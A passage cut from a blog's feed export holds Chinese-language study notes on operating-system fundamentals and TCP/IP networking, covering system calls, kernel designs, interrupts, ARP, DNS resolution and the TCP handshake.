    <link href="/2024/03/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/CS-Notes/%E6%A6%82%E8%BF%B0/"/>
    <url>/2024/03/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/CS-Notes/%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="基本特征">基本特征</h1><h2 id="并发">1. 并发</h2><p>并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。</p><p>并行需要硬件支持，如多流水线、多核处理器或者分布式计算系统。</p><p>操作系统通过引入进程和线程，使得程序能够并发运行。</p><h2 id="共享">2. 共享</h2><p>共享是指系统中的资源可以被多个并发进程共同使用。</p><p>有两种共享方式：互斥共享和同时共享。</p><p>互斥共享的资源称为临界资源，例如打印机等，在同一时刻只允许一个进程访问，需要用同步机制来实现互斥访问。</p><h2 id="虚拟">3. 虚拟</h2><p>虚拟技术把一个物理实体转换为多个逻辑实体。</p><p>主要有两种虚拟技术：时（时间）分复用技术和空（空间）分复用技术。</p><p>多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占用处理器，每次只执行一小个时间片并快速切换。</p><p>虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间的页被映射到物理内存，地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。</p><h2 id="异步">4. 异步</h2><p>异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进。</p><h1 id="基本功能">基本功能</h1><h2 id="进程管理">1. 进程管理</h2><p>进程控制、进程同步、进程通信、死锁处理、处理机调度等。</p><h2 id="内存管理">2. 内存管理</h2><p>内存分配、地址映射、内存保护与共享、虚拟内存等。</p><h2 id="文件管理">3. 文件管理</h2><p>文件存储空间的管理、目录管理、文件读写管理和保护等。</p><h2 id="设备管理">4. 设备管理</h2><p>完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。</p><p>主要包括缓冲管理、设备分配、设备处理、虛拟设备等。</p><h1 id="系统调用">系统调用</h1><p>如果一个进程在用户态需要使用内核态的功能，就进行系统调用从而陷入内核，由操作系统代为完成。</p><div data-align="center"><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/tGPV0.png" width="600"/></div><p><br></p><p>Linux 的系统调用主要有以下这些：</p><table><thead><tr class="header"><th style="text-align: center;">Task</th><th>Commands</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">进程控制</td><td>fork(); exit(); wait();</td></tr><tr class="even"><td style="text-align: center;">进程通信</td><td>pipe(); shmget(); mmap();</td></tr><tr class="odd"><td style="text-align: center;">文件操作</td><td>open(); read(); write();</td></tr><tr class="even"><td style="text-align: center;">设备操作</td><td>ioctl(); read(); write();</td></tr><tr class="odd"><td style="text-align: center;">信息维护</td><td>getpid(); alarm(); sleep();</td></tr><tr class="even"><td style="text-align: center;">安全</td><td>chmod(); umask(); chown();</td></tr></tbody></table><h1 id="宏内核和微内核">宏内核和微内核</h1><h2 id="宏内核">1. 宏内核</h2><p>宏内核是将操作系统功能作为一个紧密结合的整体放到内核。</p><p>由于各模块共享信息，因此有很高的性能。</p><h2 id="微内核">2. 微内核</h2><p>由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立。</p><p>在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态。</p><p>因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失。</p><div data-align="center"><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2_14_microkernelArchitecture.jpg"/></div><p><br></p><h1 id="中断分类">中断分类</h1><h2 id="外中断">1. 外中断</h2><p>由 CPU 执行指令以外的事件引起，如 I/O完成中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。</p><h2 id="异常">2. 异常</h2><p>由 CPU执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。</p><h2 id="陷入">3. 陷入</h2><p>在用户程序中使用系统调用。</p>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机操作系统</category>
      
      <category>CS-Notes</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基础篇</title>
    <link href="/2024/03/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2024/03/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="tcpip-网络模型">1. TCP/IP 网络模型</h1><p>对于同一台设备上的进程间通信，有很多种方式，比如有管道、消息队列、共享内存、信号等方式，而对于不同设备上的进程间通信，就需要网络通信，而设备是多样性的，为了兼容多种多样的设备，就协商出了一套<strong>通用的网络协议</strong>。这个网络协议是<strong>分层</strong>的，每一层都有各自的作用和职责。</p><h2 id="应用层">1.1 应用层</h2><p>我们能直接接触到的就是<strong>应用层</strong>（<em>ApplicationLayer</em>），我们电脑或手机使用的应用软件都是在应用层实现。当两个不同设备的应用需要通信的时候，应用就把应用数据传给下一层，也就是传输层。因此，应用层只需要专注于为用户提供应用功能，而不用去关心数据是如何传输的，好比我们寄快递的时候，只需要把包裹交给快递员，由他负责运输快递，我们不需要关心快递是如何被运输的。常见的应用层协议有：HTTP、FTP、Telnet、DNS、SMTP等。</p><p>应用层工作在操作系统中的<strong>用户态</strong>，传输层及以下则工作在<strong>内核态</strong>。</p><h2 id="传输层">1.2 传输层</h2><p><strong>传输层</strong>（<em>TransportLayer</em>）主要负责向<strong>两个主机中进程之间</strong>的通信提供服务。由于一个主机同时运行多个进程，因此运输层具有复用和分用功能。传输层在终端用户之间提供透明的数据传输，向上层提供可靠的数据传输服务。传输层在给定的链路上通过流量控制、分段/重组和差错控制来保证数据传输的可靠性。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432886.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="协议类型">1.2.1 协议类型</h3><p>传输层有两个传输协议，分别是 TCP 和 UDP：</p><ul><li><strong>TCP（<em>Transmission ControlProtocol</em>，传输控制协议）</strong>：大部分应用使用的正是 TCP协议，比如HTTP，FTP，Telnet，SMTP等。TCP 相比 UDP多了很多特性，比如<strong>流量控制、拥塞控制、超时重传</strong>等，<strong>保证</strong>数据包能可靠地传输给对方。</li><li><strong>UDP（<em>User DatagramProtocol</em>，用户数据报协议）</strong>：只负责发送数据包，<strong>不保证</strong>数据包是否能抵达对方，但它实时性相对更好，传输效率也高。当然，UDP也可以实现可靠传输，把 TCP的特性在应用层上实现就可以，不过要实现一个商用的可靠 UDP传输协议，也不是一件简单的事情。</li></ul><h3 id="数据分段">1.2.2 数据分段</h3><p>应用需要传输的数据可能会非常大，如果直接传输就不好控制，因此当传输层的数据包大小超过<strong>MSS</strong>（<em>Maximum Segment Size</em>），就要将数据包分块，这样即使中途有一个分块丢失或损坏了，只需要重新发送这一个分块，而不用重新发送整个数据包。在TCP 协议中，我们把每个分块称为一个 <strong>TCP 段</strong>（<em>TCPSegment</em>）。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432887.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>注：</p><ul><li><strong>MTU（<em>maximum transmissionunit</em>）</strong>：以太网（Ethernet）最大的数据帧是 1518字节。以太网帧的帧头的 14 字节和帧尾 CRC 校验 4 字节共占了 18字节，剩下的承载上层协议的地方也就是 Data 域最大就只剩 1500字节。这个值我们就把它称之为 MTU，可以认为是网络层能够传输的最大 IP包。</li><li><strong>MSS（<em>Maximum segmentsize</em>）</strong>：可以认为是传输层的概念，也就是 TCP数据包每次能够传输的最大量。为了达到最佳的传输效能，TCP协议在建立连接的时候通常要协商双方的 MSS 值，这个值 TCP协议在实现的时候往往用 MTU 值代替（需要减去 IP 数据包包头的大小 20Bytes和 TCP 数据段的包头 20Bytes），所以往往 MSS 为1460。通讯双方会根据双方提供的 MSS 值得最小值确定为这次连接的最大 MSS值。 同一个TCP连接，两个方向上的MSS大小可以不同。</li></ul><h3 id="端口">1.2.3 端口</h3><p>当设备作为接收方时，传输层则要负责把数据包传给应用，但是一台设备上可能会有很多应用在接收或者传输数据，因此需要用一个编号将应用区分开来，这个编号就是<strong>端口</strong>。比如80 端口通常是 Web 服务器用的，22端口通常是远程登录服务器用的。而对于浏览器（客户端）中的每个标签栏都是一个独立的进程，操作系统会为这些进程分配临时的端口号。由于传输层的报文中会携带端口号，因此接收方可以识别出该报文是发送给哪个应用。</p><h2 id="网络层">1.3 网络层</h2><p><strong>网络层</strong>（<em>InternetLayer</em>）的目的是实现<strong>两个端系统之间</strong>的数据透明传送，具体功能包括<strong>寻址和路由选择、连接的建立、保持和终止</strong>等。它提供的服务使传输层不需要了解网络中的数据传输和交换技术，只需要服务好应用即可，让其作为应用间数据传输的媒介，帮助实现应用到应用的通信，而实际的传输功能就交给自己。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432888.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="ip协议">1.3.1 IP协议</h3><p>网络层最常使用的是 <strong>IP 协议</strong>（<em>InternetProtocol</em>），IP 协议会将传输层的报文作为数据部分，再加上 IP包头组装成 IP 报文，如果 IP 报文大小超过<strong>MTU</strong>（以太网中一般为 1500字节）就会再次进行<strong>分片</strong>，得到一个即将发送到网络的 IP报文。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432889.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="ip地址">1.3.2 IP地址</h3><p>网络层负责将数据从一个设备传输到另一个设备，世界上那么多设备，又该如何找到对方呢？因此，网络层需要有区分设备的编号。</p><p>我们一般用 IP 地址给设备进行编号，对于 IPv4 协议， IP 地址共 32位，分成了四段（如192.168.100.1），每段是 8 位。一个单纯的 IP地址虽然做到了区分设备，但是寻址起来就特别麻烦，全世界那么多台设备，难道一个一个去匹配？这显然不科学。</p><p>因此，需要将 IP 地址分成两种意义：</p><ul><li>一个是<strong>网络号</strong>，负责标识该 IP地址是属于哪个「子网」的；</li><li>一个是<strong>主机号</strong>，负责标识同一「子网」下的不同主机；</li></ul><p>IP 地址 的网络号和主机号计算：</p><p>如10.100.122.0/24，为了简化子网掩码的表示，用/24代替255.255.255.0。将10.100.122.2 和 255.255.255.0进行<strong>按位与运算</strong>，就可以得到<strong>网络号</strong>；将255.255.255.0<strong>取反</strong>后与IP地址进行进行<strong>按位与运算</strong>，就可以得到<strong>主机号</strong>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432890.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="寻址和路由">1.3.3 寻址和路由</h3><ul><li><strong>寻址（Addressing）</strong>：通过地址找设备。和现实生活中的寻址是一样的，比如根据地址找到一个公寓。在IPv4 协议中，寻址找到的是一个设备所在的位置。</li><li><strong>路由（Routing）</strong>：本质是路径的选择。就好像知道地址，但是到了每个十字路口，还需要选择具体的路径。</li><li>要做路由，就必须能够理解地址，也就是需要借助寻址的能力。要通过寻址找到最终的设备，又要借助路由在每个节点选择数据传输的线路。因此，路由和寻址，是相辅相成的关系。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432892.jpg"alt="IP地址的网络号" /><figcaption aria-hidden="true">IP地址的网络号</figcaption></figure><h2 id="网络接口层">1.4 网络接口层</h2><p><strong>网络接口层</strong>（<em>LinkLayer</em>）负责将网络层的IP数据报通过物理网络发送出去，或从物理网络接收数据帧，抽取出IP数据报上交给网络层。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432893.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="以太网">1.4.1 以太网</h3><p>以太网是<strong>连接设备以建立局域网(LAN)</strong>的网络协议。该协议支持设备通过网络与另一台设备交换数据包以进行通信。</p><h3 id="mac">1.4.2 MAC</h3><p>MAC地址是一个用来<strong>确认网络设备位置</strong>的位址。MAC地址用于在网络中唯一标示一个网卡，一台设备若有一或多个网卡，则每个网卡都需要并会有一个唯一的MAC地址。</p><p>IP地址在互联网中是用于标识主机的<strong>逻辑地址</strong>，而MAC地址则是用于标识网卡的<strong>物理地址</strong>。虽然它们都是用于标识一个设备的地址，但是它们的作用和使用场景是不同的。IP地址是在网络层（OSI模型中的第三层）使用的，它是一个动态分配且具有结构化特性的地址，可以实现跨网络的通信和路由。MAC地址是在数据链路层（OSI模型中的第二层）使用的，它是一个固定且扁平化的地址，可以实现局域网内部的寻址和数据传输。</p><h3 id="arp">1.4.3 ARP</h3><p><strong>ARP</strong>（<em>Address ResolutionProtocol</em>）协议，它是一种用于根据IP地址获取MAC地址的协议。ARP协议的工作原理和过程如下：</p><ul><li>当一个主机要发送数据给另一个主机时，首先会检查自己的ARP缓存表（ARPcache），看是否已经有目标主机的IP地址和MAC地址的对应关系。如果有，则直接使用该MAC地址封装帧并发送出去。</li><li>如果没有，则需要发起ARP请求（ARPrequest），向局域网内广播一个特殊的帧，其中包含了自己的IP地址和MAC地址，以及目标主机的IP地址。该帧的目标MAC地址为广播地址FF-FF-FF-FF-FF-FF，表示所有设备都要接收该帧。</li><li>局域网内的所有设备都会收到该ARP请求帧，并根据其中的目标IP地址判断是否是自己。如果不是自己，则丢弃该帧，并且将发送者的IP地址和MAC地址加入自己的ARP缓存表中。如果是自己，则回复一个ARP应答（ARPreply），向发送者单播一个特殊的帧，其中包含了自己的IP地址和MAC地址，以及发送者的IP地址。该帧的目标MAC地址为发送者的MAC地址。</li><li>发送者收到该ARP应答帧后，就知道了目标主机的MAC地址，并将其加入自己的ARP缓存表中。然后就可以使用该MAC地址封装帧并发送出去。</li></ul><p>当一个主机要发送数据给另一个主机时，如果目标主机与自己在同一局域网内，那么就可以直接使用ARP协议获取目标主机的MAC地址，并将其封装在帧中发送出去。但是，如果目标主机与自己不在同一局域网内，那么就需要经过路由器的转发。这时候，就需要知道路由器的MAC地址，而不是目标主机的MAC地址。下面我们用一个例子来说明这种情况下的工作过程。</p><p>假设有如下拓扑：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031617400.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>现在假设<strong>主机A</strong>要向<strong>服务器S</strong>发送数据包，完整过程如下：</p><ol type="1"><li>主机A发现目标IP与自己不在同一网段，需要经过路由器转发</li><li>查路由表获得R1的IP地址及出接口（从哪个网卡发出），查ARP表无对应条目</li><li>发起ARP请求，目的IP为R1，目的MAC为广播MAC（FF:FF:FF:FF:FF:FF），源IP和源MAC为主机A网卡的IP和MAC</li><li>R1收到ARP请求，将主机A的IP和MAC加入自己的ARP缓存表，用自身IP和MAC响应主机A的ARP请求</li><li>主机A收到ARP响应，将R1的IP和MAC加入自己的ARP缓存表，用自身IP和MAC为源，服务器S的IP和R1的MAC为目的，封装数据帧，并将其转发给R1（此时数据帧源IP为主机A，目的IP为服务器S，源MAC为主机A，目的MAC为R1）</li><li>R1收到数据帧，根据目的IP查路由表，发现需要R2转发，查ARP表，无对应条目。以自身IP和MAC为源，目的IP为R2，目的MAC为广播发送ARP请求，并将来自主机A的数据帧丢弃。</li><li>R2收到ARP请求，将R1的IP和MAC加入自己的ARP缓存表，用自身IP和MAC响应主机R2的ARP请求。</li><li>R1收到ARP响应，将R2的IP和MAC加入自己的ARP缓存表</li><li>主机A发现超时，重发数据帧</li><li>R1收到数据帧，查路由表，须经R2转发，查ARP表，获得R2的MAC地址。将数据帧的源MAC修改为自身，目的MAC修改为R2，并将数据帧转发给R2（此时数据帧源IP为主机A，目的IP为服务器S，源MAC为R1，目的MAC为R2）</li><li>R2收到数据帧，根据目的IP查路由表，发现目标主机与自己在同一网段，查ARP表，无对应条目。以自身IP和MAC为源，目的IP为服务器S，目的MAC为广播发送ARP请求，并将来自R1的数据帧丢弃。</li><li>服务器S收到ARP请求，将R2的IP和MAC加入自己的ARP缓存表，用自身IP和MAC响应主机R2的ARP请求。</li><li>R2收到ARP响应，将服务器S的IP和MAC加入自己的ARP缓存表</li><li>主机A发现超时，重发数据帧</li><li>R1收到数据帧，查路由表，须经R2转发，查ARP表，获得R2的MAC地址。将数据帧的源MAC修改为自身，目的MAC修改为R2，并将数据帧转发给R2</li><li>R2收到数据帧，查路由表，须经服务器S转发，查ARP表，获得服务器S的MAC地址。将数据帧的源MAC修改为自身，目的MAC修改为服务器S，并将数据帧转发给服务器S（此时数据帧源IP为主机A，目的IP为服务器S，源MAC为R2，目的MAC为S）</li></ol><h2 id="总结">1.5 总结</h2><h3 id="协议分层">1.5.1 协议分层</h3><p>TCP/IP 网络通常是由上到下分成 4层，分别是<strong>应用层，传输层，网络层和网络接口层</strong>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432894.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="封装过程">1.5.2 封装过程</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432895.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>网络接口层的传输单位是<strong>帧（frame）</strong>，IP层的传输单位是<strong>包（packet）</strong>，TCP层的传输单位是<strong>段（segment）</strong>，HTTP的传输单位则是<strong>消息或报文（message）</strong>。但这些名词并没有什么本质的区分，可以统称为数据包。</p><h1 id="键入网址网页显示">2. 键入网址→网页显示</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432896.jpg"alt="简单的网络模型" /><figcaption aria-hidden="true">简单的网络模型</figcaption></figure><h2 id="http">2.1 HTTP</h2><h3 id="url解析">2.1.1 URL解析</h3><p>浏览器做的第一步工作就是要对 <code>URL</code>进行解析，从而生成发送给 <code>Web</code> 服务器的请求信息。URL实际上是请求服务器里的文件资源。当没有路径名时，就代表访问根目录下事先设置的<strong>默认文件</strong>，也就是<code>/index.html</code> 或者 <code>/default.html</code>这些文件，这样就不会发生混乱。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432897.jpg"alt="URL 解析" /><figcaption aria-hidden="true">URL 解析</figcaption></figure><h3 id="http-请求">2.1.2 HTTP 请求</h3><p>对 <code>URL</code> 进行解析之后，浏览器确定了 Web服务器和文件名，接下来就可以根据这些信息生成 HTTP 请求消息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432898.jpg"alt="HTTP 的消息格式" /><figcaption aria-hidden="true">HTTP 的消息格式</figcaption></figure><h2 id="dns">2.2 DNS</h2><p>通过浏览器解析 URL 并生成 HTTP 消息后，需要委托操作系统将消息发送给<code>Web</code>服务器。但在发送之前，还有一项工作需要完成，那就是<strong>查询服务器域名对应的IP 地址</strong>，因为委托操作系统发送消息时，必须提供通信对象的 IP地址。比如我们打电话的时候，必须要知道对方的电话号码，但由于电话号码难以记忆，所以通常我们会将对方电话号+ 姓名保存在通讯录里。</p><p>有一种服务器就专门保存了 <code>Web</code> 服务器域名与<code>IP</code> 的对应关系，它就是 <code>DNS</code> 服务器。</p><h3 id="层次化dns">2.2.1 层次化DNS</h3><p>DNS 中的域名都是用<strong>句点</strong>来分隔的，比如<code>www.server.com</code>，这里的句点代表了不同层次之间的<strong>界限</strong>。在域名中，<strong>越靠右</strong>的位置表示其层级<strong>越高</strong>。实际上域名最后还有一个点，比如<code>www.server.com.</code>，这个最后的一个点代表根域名。也就是，<code>.</code>根域是在最顶层，它的下一层就是 <code>.com</code> 顶级域，再下面是<code>server.com</code>。所以域名的层级关系类似一个树状结构：</p><ul><li>根 DNS 服务器（.）</li><li>顶级域 DNS 服务器（.com）</li><li>权威 DNS 服务器（server.com）</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432899.jpg"alt="DNS 树状结构" /><figcaption aria-hidden="true">DNS 树状结构</figcaption></figure><p>根域的 DNS 服务器信息保存在互联网中所有的 DNS服务器中。这样一来，任何 DNS 服务器就都可以找到并访问根域 DNS服务器了。因此，客户端只要能够找到任意一台 DNS服务器，就可以通过它找到根域 DNS服务器，然后再一路顺藤摸瓜找到位于下层的某台目标 DNS 服务器。</p><h3 id="域名解析">2.2.2 域名解析</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432900.png"alt="image-20240319133130567" /><figcaption aria-hidden="true">image-20240319133130567</figcaption></figure><ul><li><strong>迭代</strong>查询（2至7）：域名服务器返回单次查询的结果，下一级的查询由用户自己请求。</li><li><strong>递归</strong>查询（1和8）：用户只需要发出一次查询请求。</li></ul><blockquote><p>是不是每次解析域名都要经过那么多的步骤呢？当然不是，还有缓存。浏览器会先看自身有没有对这个域名的缓存，如果有，就直接返回，如果没有，就去问操作系统，操作系统也会去看自己的缓存，如果有，就直接返回，如果没有，再去hosts 文件看，也没有，才会去问「本地 DNS 服务器」。</p></blockquote><ol type="1"><li>浏览器缓存</li><li>操作系统缓存</li><li>hosts文件</li><li>本地DNS服务器</li></ol><h2 id="协议栈">2.3 协议栈</h2><p>通过 DNS 获取到 IP 后，就可以把 HTTP的传输工作交给操作系统中的<strong>协议栈</strong>。协议栈分为几个部分，分别承担不同的工作。上下关系是有一定的规则的，上面的部分会向下面的部分委托工作，下面的部分收到委托的工作并执行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432901.png"alt="image-20240319133450086" /><figcaption aria-hidden="true">image-20240319133450086</figcaption></figure><p>应用程序（浏览器）通过调用 Socket库，来委托协议栈工作。协议栈的上半部分有两块，分别是负责收发数据的 TCP和 UDP协议，这两个传输协议会接受应用层的委托执行收发数据的操作。协议栈的下面一半是用IP协议控制网络包收发操作，在互联网上传数据时，数据会被切分成一块块的网络包，而将网络包发送给对方的操作就是由IP 负责的。此外 IP 中还包括 <code>ICMP</code> 协议和 <code>ARP</code>协议。</p><ul><li><code>ICMP</code>用于告知网络包传送过程中产生的错误以及各种控制信息。</li><li><code>ARP</code> 用于根据 IP 地址查询相应的以太网 MAC 地址。</li></ul><p>IP下面的网卡驱动程序负责控制网卡硬件，而最下面的网卡则负责完成实际的收发操作，也就是对网线中的信号执行发送和接收操作。</p><h2 id="tcp">2.4 TCP</h2><h3 id="报文格式">2.4.1 报文格式</h3><p>HTTP 是基于 TCP 协议传输的，所以在这我们先了解下 TCP 协议。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432902.png"alt="image-20240319133905641" /><figcaption aria-hidden="true">image-20240319133905641</figcaption></figure><ul><li><strong>源端口号</strong>和<strong>目标端口号</strong>：如果没有这两个端口号，数据就不知道应该发给哪个应用。</li><li><strong>序号</strong>：解决包<strong>乱序</strong>的问题。</li><li><strong>确认号</strong>：确认发出去对方是否有收到。如果没有收到就应该重新发送，直到送达，解决<strong>丢包</strong>的问题。</li><li><strong>状态位</strong>：例如 <code>SYN</code>是发起一个连接，<code>ACK</code> 是回复，<code>RST</code>是重新连接，<code>FIN</code> 是结束连接等。TCP是面向连接的，因而双方要维护连接的状态，这些带状态位的包的发送，会引起双方的状态变更。</li><li><strong>窗口大小</strong>：TCP要做<strong>流量控制</strong>，通信双方各声明一个窗口（缓存大小），标识自己当前能够的处理能力，别发送的太快，撑死我，也别发的太慢，饿死我。（注：除了做流量控制以外，TCP还会做<strong>拥塞控制</strong>，对于真正的通路堵车不堵车，它无能为力，唯一能做的就是控制自己，即控制发送的速度。不能改变世界，就改变自己嘛。）</li></ul><h3 id="三次握手">2.4.2 三次握手</h3><p>在 HTTP 传输数据之前，首先需要 TCP 建立连接，TCP连接的建立，通常称为<strong>三次握手</strong>。这个所谓的「连接」，只是双方计算机里维护一个状态机，在连接建立的过程中，双方的状态变化时序图就像这样。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432903.png"alt="image-20240319134142626" /><figcaption aria-hidden="true">image-20240319134142626</figcaption></figure><ul><li>一开始，客户端和服务端都处于 <code>CLOSED</code> 状态。</li><li>服务端主动监听某个端口，处于 <code>LISTEN</code> 状态。</li><li>然后客户端主动发起连接 <code>SYN</code>，之后处于<code>SYN-SENT</code> 状态。</li><li>服务端收到发起的连接，返回 <code>SYN</code>，并且 <code>ACK</code>客户端的 <code>SYN</code>，之后处于 <code>SYN-RCVD</code> 状态。</li><li>客户端收到服务端发送的 <code>SYN</code> 和 <code>ACK</code>之后，发送对 <code>SYN</code> 确认的 <code>ACK</code>，之后处于<code>ESTABLISHED</code> 状态，因为它一发一收成功了。</li><li>服务端收到 <code>ACK</code> 的 <code>ACK</code> 之后，处于<code>ESTABLISHED</code> 状态，因为它也一发一收了。</li></ul><p>所以三次握手目的是<strong>保证双方都有发送和接收的能力</strong>。</p><h3 id="连接状态">2.4.3 连接状态</h3><p>Linux 可以通过 <code>netstat -napt</code> 命令查看TCP的连接状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432904.png"alt="image-20240319134333755" /><figcaption aria-hidden="true">image-20240319134333755</figcaption></figure><h3 id="数据分段-1">2.3.4 数据分段</h3><p>如果 HTTP 请求消息比较长，超过了 <code>MSS</code> 的长度，这时 TCP就需要把 HTTP的数据拆解成一块块的数据发送，而不是一次性发送所有数据。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432905.png"alt="image-20240319134408441" /><figcaption aria-hidden="true">image-20240319134408441</figcaption></figure><ul><li><code>MTU</code>：一个网络包的最大长度，以太网中一般为<code>1500</code> 字节。</li><li><code>MSS</code>：除去 IP 和 TCP 头部之后，一个网络包所能容纳的 TCP数据的最大长度。</li></ul><p>数据会被以 <code>MSS</code>的长度为单位进行拆分，拆分出来的每一块数据都会被放进单独的网络包中。也就是在每个被拆分的数据加上TCP 头信息，然后交给 IP 模块来发送数据。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432906.png"alt="image-20240319134452623" /><figcaption aria-hidden="true">image-20240319134452623</figcaption></figure><h3 id="生成报文">2.3.5 生成报文</h3><p>TCP协议里面会有两个端口，一个是浏览器监听的端口（通常是随机生成的），一个是Web 服务器监听的端口（HTTP 默认端口号是 <code>80</code>， HTTPS默认端口号是 <code>443</code>）。在双方建立了连接后，TCP报文中的数据部分就是存放 HTTP 头部 + 数据，组装好 TCP报文之后，就需交给下面的网络层处理。至此，网络包的报文如下图。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432908.png"alt="image-20240319134602101" /><figcaption aria-hidden="true">image-20240319134602101</figcaption></figure><h2 id="ip">2.5 IP</h2><p>TCP 模块在执行连接、收发、断开等各阶段操作时，都需要委托 IP模块将数据封装成<strong>网络包</strong>发送给通信对象。</p><h3 id="报文格式-1">2.5.1 报文格式</h3><p>我们先看看 IP 报文头部的格式：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432909.png"alt="image-20240319134708408" /><figcaption aria-hidden="true">image-20240319134708408</figcaption></figure><p>在 IP 协议里面需要有<strong>源地址 IP</strong> 和 <strong>目标地址IP</strong>：</p><ul><li>源IP：客户端的 IP 地址；</li><li>目标IP：</li><li>通过 DNS 域名解析得到的 Web 服务器 IP。</li></ul><p>因为 HTTP 是经过 TCP 传输的，所以在 IP包头的<strong>协议号</strong>，要填写为<code>06</code>（十六进制），表示协议为 TCP。</p><h3 id="ip选择">2.5.2 IP选择</h3><blockquote><p>假设客户端有多个网卡，就会有多个 IP 地址，那 IP头部的源地址应该选择哪个 IP 呢？</p></blockquote><p>当存在多个网卡时，在填写源地址 IP时，就需要判断到底应该填写哪个地址。这个判断相当于在多块网卡中判断应该使用哪个一块网卡来发送包。这个时候就需要根据<strong>路由表</strong>规则，来判断哪一个网卡作为源地址IP。在 Linux 操作系统，我们可以使用 <code>route -n</code>命令查看当前系统的路由表。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432910.png"alt="image-20240319134829311" /><figcaption aria-hidden="true">image-20240319134829311</figcaption></figure><p>举个例子，根据上面的路由表，我们假设 Web 服务器的目标地址是<code>192.168.10.200</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432911.png"alt="image-20240319134922738" /><figcaption aria-hidden="true">image-20240319134922738</figcaption></figure><ol 